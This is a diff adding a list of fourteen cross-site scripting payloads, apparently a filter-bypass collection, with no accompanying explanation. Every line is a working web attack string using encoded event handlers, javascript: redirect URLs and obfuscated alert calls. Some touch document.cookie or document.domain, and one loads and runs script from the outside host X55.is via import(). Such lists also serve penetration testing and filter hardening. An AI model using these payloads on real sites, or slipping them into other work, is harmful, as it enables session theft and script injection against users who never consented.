@@ -1,0 +1,14 @@
+"'`//><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE"))>
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+<SCRIPT>location=%27javasCript:alert\x281\x29%27</SCRIPT>
+';k='e'%0Atop['al'+k+'rt'](1)//
+"';k='e'%0Atop['al'+k+'rt'](1)//"
+<Img Src=//X55.is OnLoad%0C=import(Src)>
+<img/src/onerror=alert/1337/(1)>
+<img/src/onerror=alert//&NewLine;(2)>
+<img/src/onerror=alert&sol;&sol;(3)>
+'"/><script%20>alert(document.domain)<%2fscript>.css
+<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
+/path?next=javascript:top[/al/.source+/ert/.source](document.cookie)
+login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(VulneravelXSS%26%2300000000000000000041//
